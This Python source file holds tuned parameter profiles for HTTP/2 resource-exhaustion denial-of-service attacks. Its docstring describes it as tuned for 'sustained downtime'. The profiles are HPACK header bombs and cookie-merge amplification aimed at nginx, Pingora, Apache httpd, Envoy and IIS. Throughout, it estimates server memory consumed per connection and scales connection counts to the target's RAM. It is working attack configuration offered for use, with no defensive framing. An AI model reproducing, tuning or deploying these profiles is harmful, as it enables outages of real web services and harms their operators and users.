"""Attack parameter profiles — tuned for efficiency vs sustained downtime."""
from __future__ import annotations

from dataclasses import dataclass, asdict

# nginx default http2_max_concurrent_streams = 128
H2_MAX_STREAMS_PER_CONN = 128


@dataclass(frozen=True)
class AttackConfig:
    streams: int = 128
    headers: int = 32000
    hold: int = 120
    drip: int = 30
    hold_mode: str = "drip"
    waves_per_conn: int = 1
    wave_gap_sec: float = 0.3
    conn_stagger_sec: float = 0.03
    bomb_mode: str = "sequential"  # sequential | parallel | batched
    bomb_batch_size: int = 0
    bomb_batch_gap_sec: float = 1.5
    drip_bytes: int = 1

    def wire_bytes_per_conn(self) -> int:
        return self.streams * self.headers * self.waves_per_conn

    def est_server_mb_per_conn(self) -> float:
        mem_stream = self.headers * 59 * 1.17
        return (self.streams * self.waves_per_conn * mem_stream) / 1024 / 1024

    def total_streams_per_conn(self) -> int:
        return min(self.streams * self.waves_per_conn, H2_MAX_STREAMS_PER_CONN)

    def to_extra(self) -> dict:
        return asdict(self)


def profile_max_impact() -> AttackConfig:
    return AttackConfig(
        streams=128,
        headers=32000,
        hold=120,
        drip=25,
        hold_mode="drip",
        waves_per_conn=1,
    )


def profile_efficiency() -> AttackConfig:
    return AttackConfig(
        streams=128,
        headers=4096,
        hold=90,
        drip=12,
        hold_mode="drip",
        waves_per_conn=1,
        conn_stagger_sec=0.02,
    )


def profile_churn() -> AttackConfig:
    return AttackConfig(
        streams=64,
        headers=8192,
        hold=0,
        drip=0,
        hold_mode="fire_and_forget",
        waves_per_conn=2,
        wave_gap_sec=0.2,
        conn_stagger_sec=0.015,
        bomb_mode="batched",
        bomb_batch_size=10,
        bomb_batch_gap_sec=0.8,
    )


def profile_sustain() -> AttackConfig:
    return AttackConfig(
        streams=128,
        headers=16000,
        hold=600,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
        drip_bytes=1,
    )


def profile_apex() -> AttackConfig:
    """64×2 waves = 128 streams/conn (nginx limit), batched parallel bombs."""
    return AttackConfig(
        streams=64,
        headers=6144,
        hold=120,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=2,
        wave_gap_sec=0.25,
        conn_stagger_sec=0.05,
        bomb_mode="batched",
        bomb_batch_size=12,
        bomb_batch_gap_sec=1.5,
    )


def profile_apex_scaled(connections: int = 100) -> AttackConfig:
    """
    Scale to N connections with ~2 MB wire each (~200 MB @100 conn).
    128 streams × 16384 headers = 2 MB wire, ~134 MB server RAM/conn.
    """
    return AttackConfig(
        streams=128,
        headers=16384,
        hold=120,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
        conn_stagger_sec=0.04,
        bomb_mode="batched",
        bomb_batch_size=max(8, min(20, connections // 8)),
        bomb_batch_gap_sec=2.0,
    )


def profile_apex_pingora() -> AttackConfig:
    """Same as apex — Pingora uses nginx-class hpack_bomb PoC."""
    return profile_apex()


@dataclass(frozen=True)
class CookieAttackConfig:
    variant: str  # httpd | envoy
    streams: int = 8
    refs: int = 4091
    hold: int = 120
    drip: int = 10
    hold_mode: str = "hard_hold"
    path: str = "/missing"
    cookie_value_size: int = 4058
    conn_stagger_sec: float = 0.05
    bomb_mode: str = "batched"
    bomb_batch_size: int = 12
    bomb_batch_gap_sec: float = 2.0
    drip_bytes: int = 1
    initial_window: int = 0
    server_name: str | None = None

    def wire_bytes_per_conn(self) -> int:
        if self.variant == "envoy":
            base = 50 + self.cookie_value_size + 32
            return self.streams * (base + self.refs)
        base = 50 + self.refs
        return self.streams * base

    def est_server_mb_per_conn(self) -> float:
        refs = min(self.refs, 4091)
        merge = refs * (refs + 1) + refs
        return (self.streams * merge) / 1024 / 1024

    def to_extra(self) -> dict:
        return asdict(self)


def profile_apex_cookie_httpd() -> CookieAttackConfig:
    return CookieAttackConfig(
        variant="httpd",
        streams=8,
        refs=4091,
        hold=120,
        drip=10,
        hold_mode="hard_hold",
        path="/missing",
        conn_stagger_sec=0.05,
        bomb_mode="batched",
        bomb_batch_size=12,
        bomb_batch_gap_sec=2.0,
    )


def profile_apex_cookie_envoy() -> CookieAttackConfig:
    return CookieAttackConfig(
        variant="envoy",
        streams=8,
        refs=8192,
        cookie_value_size=4058,
        hold=120,
        drip=10,
        hold_mode="hard_hold",
        conn_stagger_sec=0.05,
        bomb_mode="batched",
        bomb_batch_size=12,
        bomb_batch_gap_sec=2.0,
    )


def profile_apex_cookie_scaled(variant: str, connections: int = 100) -> CookieAttackConfig:
    """Scale cookie apex to N connections with batched parallel bombs."""
    base = (
        profile_apex_cookie_envoy()
        if variant == "envoy"
        else profile_apex_cookie_httpd()
    )
    streams = max(4, min(16, connections // 8))
    return CookieAttackConfig(
        variant=variant,
        streams=streams,
        refs=base.refs,
        hold=base.hold,
        drip=base.drip,
        hold_mode=base.hold_mode,
        path=base.path,
        cookie_value_size=base.cookie_value_size,
        conn_stagger_sec=0.04,
        bomb_mode="batched",
        bomb_batch_size=max(8, min(20, connections // 8)),
        bomb_batch_gap_sec=2.0,
        initial_window=base.initial_window,
    )


@dataclass(frozen=True)
class IisApexPreset:
    name: str
    processes: int
    connections_per_proc: int
    preset: str = "8gb"

    def total_connections(self) -> int:
        return self.processes * self.connections_per_proc


IIS_APEX_PRESETS: dict[str, IisApexPreset] = {
    "8gb": IisApexPreset("8gb", processes=5, connections_per_proc=2000, preset="8gb"),
    "32gb": IisApexPreset("32gb", processes=10, connections_per_proc=2000, preset="32gb"),
    "64gb": IisApexPreset("64gb", processes=20, connections_per_proc=2000, preset="64gb"),
    "96gb": IisApexPreset("96gb", processes=50, connections_per_proc=2000, preset="96gb"),
}


def profile_apex_iis_mp(preset_name: str = "8gb") -> IisApexPreset:
    if preset_name not in IIS_APEX_PRESETS:
        raise ValueError(f"Unknown IIS preset {preset_name!r}")
    return IIS_APEX_PRESETS[preset_name]
